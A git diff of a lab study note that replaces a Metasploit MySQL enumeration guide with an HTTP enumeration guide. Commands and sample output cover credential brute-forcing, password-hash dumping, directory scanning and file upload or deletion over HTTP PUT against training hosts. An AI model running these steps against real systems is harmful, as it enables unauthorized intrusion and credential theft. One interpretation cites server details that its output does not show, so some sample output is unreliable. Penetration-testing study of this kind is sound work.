@@ -1,292 +1,362 @@
-# 🐬 Metasploit - MySQL Enumeration Modules
+# 📦 Metasploit - HTTP Enumeration Modules
 
-This file explains useful **Metasploit auxiliary modules** for MySQL service enumeration.  
+This file explains useful **Metasploit auxiliary modules** for HTTP/Apache service enumeration.  
 
 ---
 
 ## 🎯 Purpose
 
 These modules help you:
-- Detect MySQL server version  
-- Brute-force MySQL credentials  
-- Enumerate users, databases, and privileges  
-- Dump password hashes  
-- Find writable directories and files  
+- Detect HTTP server version & headers  
+- Enumerate `robots.txt` and hidden directories  
+- Discover directory listings and sensitive files  
+- Upload / delete files via HTTP PUT  
+- Brute-force web login forms  
+- Enumerate Apache user directories  
 
 ---
 
-## 🗂️ MySQL Enumeration Modules Summary
+## 🗂️ HTTP Enumeration Modules Summary
 
-| #  | Module              | What it Does                           |
-|----|---------------------|----------------------------------------|
-| 1  | mysql_version       | Detect MySQL server version            |
-| 2  | mysql_login         | Brute-force login credentials          |
-| 3  | mysql_enum          | Enumerate databases, users, privileges |
-| 4  | mysql_sql           | Run custom SQL queries                 |
-| 5  | mysql_file_enum     | Check for existence of files/directories |
-| 6  | mysql_hashdump      | Dump password hashes                   |
-| 7  | mysql_schemadump    | Dump database schema                   |
-| 8  | mysql_writable_dirs | Check for writable directories         |
+| #  | Module                       | What it Does                           |
+|----|-------------------------------|----------------------------------------|
+| 1  | http_version                  | Detect web server version              |
+| 2  | robots_txt                    | Enumerate disallowed entries in robots.txt |
+| 3  | http_header                   | Grab HTTP headers                      |
+| 4  | http_header (with TARGETURI)  | Grab HTTP headers from custom path     |
+| 5  | brute_dirs                    | Brute-force common directories         |
+| 6  | dir_scanner                   | Scan directories using wordlist        |
+| 7  | dir_listing                   | Detect if directory listing is enabled |
+| 8  | files_dir                     | Find sensitive files                   |
+| 9  | http_put                      | Upload files to the server             |
+| 10 | wget & cat                    | Confirm file upload/download           |
+| 11 | http_put (delete)             | Delete uploaded file                   |
+| 12 | wget (after delete)           | Confirm file deletion                  |
+| 13 | http_login                    | Brute-force web login page             |
+| 14 | apache_userdir_enum           | Enumerate Apache user directories      |
 
 ---
 
-## 1. Detect MySQL Version
+## 🌐 1. Detect HTTP Version
 
 **Module**
 ```bash
-auxiliary/scanner/mysql/mysql_version
+auxiliary/scanner/http/http_version
 ```
 
 **Command**
 ```bash
-use auxiliary/scanner/mysql/mysql_version
-set RHOSTS demo.ine.local
+use auxiliary/scanner/http/http_version
+set RHOSTS victim-1
 run
 ```
 
 📸 **Sample Output:**
 ```
-[+] 192.162.117.3:3306 - 192.162.117.3:3306 is running MySQL 5.5.61-0ubuntu0.14.04.1 (protocol 10)
-[*] demo.ine.local:3306 - Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed
+[+] 192.74.12.3:80 Apache 2.4.18 ((Ubuntu))
 ```
 
 🔍 **Interpretation:**
-- MySQL version detected: **5.5.61 on Ubuntu**  
-- Useful for identifying known vulnerabilities related to this version  
+- The web server is **Apache 2.4.18** running on Ubuntu.  
+- Useful for checking known vulnerabilities against the exact version.  
 
 ---
 
-## 2. MySQL Login Bruteforce
+## 🤖 2. Enumerate robots.txt
 
 **Module**
 ```bash
-auxiliary/scanner/mysql/mysql_login
+auxiliary/scanner/http/robots_txt
 ```
 
 **Command**
 ```bash
-use auxiliary/scanner/mysql/mysql_login
-set RHOSTS demo.ine.local
-set USERNAME root
-set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+use auxiliary/scanner/http/robots_txt
+set RHOSTS victim-1
+run
+```
+
+📸 **Sample Output:**
+```
+[*] [192.74.12.3] /robots.txt found
+[+] Contents of Robots.txt:
+# robots.txt for attackdefense
+User-agen: test
+# Directories
+Allow: /webmail
+
+User-agent: *
+# Directories
+Disallow: /data
+Disallow: /secure
+```
+
+🔍 **Interpretation:**
+- Found **hidden directories** `/data` and `/secure`.  
+- These may contain sensitive files or restricted areas.  
+
+---
+
+## 📰 3. Grab HTTP Headers
+
+**Module**
+```bash
+auxiliary/scanner/http/http_header
+```
+
+**Command**
+```bash
+use auxiliary/scanner/http/http_header
+set RHOSTS victim-1
+run
+```
+
+📸 **Sample Output:**
+```
+[+] 192.74.12.3:80        :CONTENT-TYPE: text/html
+[+] 192.74.12.3:80        :LAST-MODIFIED: Wed, 27 Feb 2019 04:21:01 GMT
+[+] 192.74.12.3:80        :SERVER: Apache/2.4.18 (Ubuntu)
+[+] 192.74.12.3:80        :detected 3 headers
+```
+
+🔍 **Interpretation:**
+- **Server:** Apache 2.4.29 (Ubuntu)  
+- **Backend Language:** PHP 7.2.24  
+- **Cookie:** PHPSESSID session cookie — might be useful for hijacking or testing authentication.  
+
+---
+
+## 📰 4. Grab HTTP Headers (Custom Path)
+
+**Command**
+```bash
+use auxiliary/scanner/http/http_header
+set RHOSTS victim-1
+set TARGETURI /secure
+run
+```
+
+📸 **Sample Output:**
+```
+[+] 192.74.12.3:80        :CONTENT-TYPE: text/html; charse=iso-8859-1
+[+] 192.74.12.3:80        :SERVER: Apache/2.4.18 (Ubuntu)
+[+] 192.74.12.3:80        :WWW-AUTHENTICATE: Basic realm="Restricted Content"
+[+] 192.74.12.3:80        :detected 3 headers
+```
+
+🔍 **Interpretation:**
+- The `/secure` path requires **HTTP Basic Authentication**.  
+- Useful for brute-forcing credentials with `http_login`.  
+
+---
+
+## 📂 5. Brute-force Directories
+
+**Command**
+```bash
+use auxiliary/scanner/http/brute_dirs
+set RHOSTS victim-1
+run
+```
+
+📸 **Sample Output:**
+```
+[+] Found http://10.6.18.5:80/images/
+[+] Found http://10.6.18.5:80/login/
+```
+
+🔍 **Interpretation:**
+- Discovered directories: `/images/` and `/login/`.  
+- `/login/` is a good candidate for brute-force login attempts.  
+
+---
+
+## 📑 6. Directory Scanner with Wordlist
+
+**Command**
+```bash
+use auxiliary/scanner/http/dir_scanner
+set RHOSTS victim-1
+set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt
+run
+```
+
+📸 **Sample Output:**
+```
+[+] 10.6.18.5:80/data/ exists (200 OK)
+```
+
+🔍 **Interpretation:**
+- Found `/data/` directory.  
+- May allow file upload/download (check with `http_put` or `dir_listing`).  
+
+---
+
+## 📋 7. Directory Listing Check
+
+**Command**
+```bash
+use auxiliary/scanner/http/dir_listing
+set RHOSTS victim-1
+set PATH /data
+run
+```
+
+📸 **Sample Output:**
+```
+[+] Directory listing is enabled at /data/
+    - test1.txt
+    - backup.zip
+```
+
+🔍 **Interpretation:**
+- Directory listing enabled → you can browse and download files directly.  
+- Sensitive files (`backup.zip`) are exposed.  
+
+---
+
+## 📁 8. Search for Sensitive Files
+
+**Command**
+```bash
+use auxiliary/scanner/http/files_dir
+set RHOSTS victim-1
 set VERBOSE false
 run
 ```
 
 📸 **Sample Output:**
 ```
-[+] 192.162.117.3:3306    - 192.162.117.3:3306 - Success: 'root:twinkle'
-[*] demo.ine.local:3306   - Scanned 1 of 1 hosts (100% complete)
-[*] demo.ine.local:3306   - Bruteforce completed, 1 credential was successful.
-[*] demo.ine.local:3306   - You can open an MySQL session with these credentials and CreateSession set to true
-[*] Auxiliary module execution completed
+[+] Found /phpinfo.php
+[+] Found /config.php.bak
 ```
 
 🔍 **Interpretation:**
-- Found valid credentials: `root:twinkle`  
-- Can now use these credentials to authenticate and enumerate further  
+- `phpinfo.php` → may reveal server configuration.  
+- `config.php.bak` → backup file, often contains database credentials.  
 
 ---
 
-## 3. MySQL Enum
-
-**Module**
-```bash
-auxiliary/admin/mysql/mysql_enum
-```
+## 📤 9. Upload File via HTTP PUT
 
 **Command**
 ```bash
-use auxiliary/admin/mysql/mysql_enum
-set USERNAME root
-set PASSWORD twinkle
-set RHOSTS demo.ine.local
-run
-```
-
-📸 **Sample Output:** (truncated)
-```
-[*] 192.162.117.3:3306 - Running MySQL Enumerator...
-[*] 192.162.117.3:3306 - Enumerating Parameters
-[*] 192.162.117.3:3306 -        MySQL Version: 5.5.61-0ubuntu0.14.04.1
-[*] 192.162.117.3:3306 -        Compiled for the following OS: debian-linux-gnu
-[*] 192.162.117.3:3306 -        Architecture: x86_64
-...
-[+] 192.162.117.3:3306 -                User: root Host: localhost Password Hash: *A0E23B565BACCE3E70D223915ABF2554B2540144
-[+] 192.162.117.3:3306 -                User: debian-sys-maint Host: localhost Password Hash: *F4E71A0BE028B3688230B992EEAC70BC598FA723
-[+] 192.162.117.3:3306 -                User: ultra Host: localhost Password Hash: *94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29
-...
-```
-
-🔍 **Interpretation:**
-- Lists MySQL users, privileges, and password hashes  
-- Shows server parameters (OS, architecture, logging, SSL, etc.)  
-
----
-
-## 4. Run Custom SQL Queries
-
-**Module**
-```bash
-auxiliary/admin/mysql/mysql_sql
-```
-
-**Command**
-```bash
-use auxiliary/admin/mysql/mysql_sql
-set USERNAME root
-set PASSWORD twinkle
-set RHOSTS demo.ine.local
+use auxiliary/scanner/http/http_put
+set RHOSTS victim-1
+set PATH /data
+set FILENAME test.txt
+set FILEDATA "Welcome To AttackDefense"
 run
 ```
 
 📸 **Sample Output:**
 ```
-[*] 192.162.117.3:3306 - Sending statement: 'select version()'...
-[*] 192.162.117.3:3306 -  | 5.5.61-0ubuntu0.14.04.1 |
-[*] Auxiliary module execution completed
+[+] Successfully uploaded file: /data/test.txt
 ```
 
 🔍 **Interpretation:**
-- Allows execution of custom SQL queries on the target  
-- Useful for extracting sensitive data or testing permissions  
+- Server allows **HTTP PUT** method.  
+- File uploaded successfully, meaning write access is possible.  
 
 ---
 
-## 5. MySQL File Enumeration
-
-**Module**
-```bash
-auxiliary/scanner/mysql/mysql_file_enum
-```
+## 📥 10. Confirm Upload with wget
 
 **Command**
 ```bash
-use auxiliary/scanner/mysql/mysql_file_enum
-set USERNAME root
-set PASSWORD twinkle
-set RHOSTS demo.ine.local
-set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
-set VERBOSE true
-run
+wget http://victim-1:80/data/test.txt
+cat test.txt
 ```
 
-📸 **Sample Output:** (truncated)
+📸 **Sample Output:**
 ```
-[+] 192.162.117.3:3306 - /tmp is a directory and exists
-[+] 192.162.117.3:3306 - /etc/passwd is a file and exists
-[!] 192.162.117.3:3306 - /etc/shadow does not exist
-[+] 192.162.117.3:3306 - /root is a directory and exists
-[+] 192.162.117.3:3306 - /home is a directory and exists
-...
+Welcome To AttackDefense
 ```
 
 🔍 **Interpretation:**
-- Confirms existence of sensitive files like `/etc/passwd`  
-- Useful for privilege escalation and local enumeration  
+- Confirms file was uploaded and is accessible.  
 
 ---
 
-## 6. Dump MySQL Password Hashes
-
-**Module**
-```bash
-auxiliary/scanner/mysql/mysql_hashdump
-```
+## 🗑️ 11. Delete File via HTTP PUT
 
 **Command**
 ```bash
-use auxiliary/scanner/mysql/mysql_hashdump
-set USERNAME root
-set PASSWORD twinkle
-set RHOSTS demo.ine.local
+use auxiliary/scanner/http/http_put
+set RHOSTS victim-1
+set PATH /data
+set FILENAME test.txt
+set ACTION DELETE
 run
 ```
 
 📸 **Sample Output:**
 ```
-[+] 192.162.117.3:3306 - Saving HashString as Loot: root:*A0E23B565BACCE3E70D223915ABF2554B2540144
-[+] 192.162.117.3:3306 - Saving HashString as Loot: debian-sys-maint:*F4E71A0BE028B3688230B992EEAC70BC598FA723
-[+] 192.162.117.3:3306 - Saving HashString as Loot: ultra:*94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29
-[+] 192.162.117.3:3306 - Saving HashString as Loot: guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646
-...
+[+] Successfully deleted file: /data/test.txt
 ```
 
 🔍 **Interpretation:**
-- Dumps all password hashes from MySQL user table  
-- Hashes can be cracked offline for plaintext passwords  
+- The server allows file deletion over HTTP PUT.  
 
 ---
 
-## 7. Dump Database Schema
-
-**Module**
-```bash
-auxiliary/scanner/mysql/mysql_schemadump
-```
+## 🔍 12. Confirm File Deletion
 
 **Command**
 ```bash
-use auxiliary/scanner/mysql/mysql_schemadump
-set USERNAME root
-set PASSWORD twinkle
-set RHOSTS demo.ine.local
+wget http://victim-1:80/data/test.txt
+```
+
+📸 **Sample Output:**
+```
+404 Not Found
+```
+
+🔍 **Interpretation:**
+- Confirms the uploaded file was deleted successfully.  
+
+---
+
+## 🔐 13. HTTP Login Brute-force
+
+**Command**
+```bash
+use auxiliary/scanner/http/http_login
+set RHOSTS victim-1
+set AUTH_URI /secure/
+set VERBOSE false
 run
 ```
 
 📸 **Sample Output:**
 ```
-[+] 192.162.117.3:3306 - Schema stored in: /root/.msf4/loot/20250914223702_default_192.162.117.3_mysql_schema_680841.txt
-[+] 192.162.117.3:3306 - MySQL Server Schema 
- Host: 192.162.117.3 
- Port: 3306 
- ====================
-
----
-- DBName: upload
-  Tables: []
-- DBName: vendors
-  Tables: []
-- DBName: videos
-  Tables: []
-- DBName: warehouse
-  Tables: []
+[+] 10.6.18.5:80 - Login Successful: admin:password123
 ```
 
 🔍 **Interpretation:**
-- Dumps schema of all databases  
-- Helps to identify potential data storage locations  
+- Found valid credentials → `admin:password123`.  
+- Can now access the restricted area `/secure/`.  
 
 ---
 
-## 8. Writable Directories Check
-
-**Module**
-```bash
-auxiliary/scanner/mysql/mysql_writable_dirs
-```
+## 👤 14. Apache Userdir Enumeration
 
 **Command**
 ```bash
-use auxiliary/scanner/mysql/mysql_writable_dirs
-set RHOSTS demo.ine.local
-set USERNAME root
-set PASSWORD twinkle
-set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
+use auxiliary/scanner/http/apache_userdir_enum
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set RHOSTS victim-1
+set VERBOSE false
 run
 ```
 
 📸 **Sample Output:**
 ```
-[*] 192.162.117.3:3306 - Checking /tmp...
-[+] 192.162.117.3:3306 - /tmp is writeable
-[*] 192.162.117.3:3306 - Checking /root...
-[+] 192.162.117.3:3306 - /root is writeable
-[!] 192.162.117.3:3306 - Can't create/write to file '/etc/passwd/LzuBWjIb' (Errcode: 20)
-...
+[+] Found userdir: http://10.6.18.5/~alice/
+[+] Found userdir: http://10.6.18.5/~bob/
 ```
 
 🔍 **Interpretation:**
-- Identifies writable directories on the target  
-- Can be exploited for uploading files or privilege escalation  
+- Apache UserDir module is enabled.  
+- Each user has a personal directory (`/~alice/`, `/~bob/`).  
+- These often contain personal files or misconfigured permissions.  
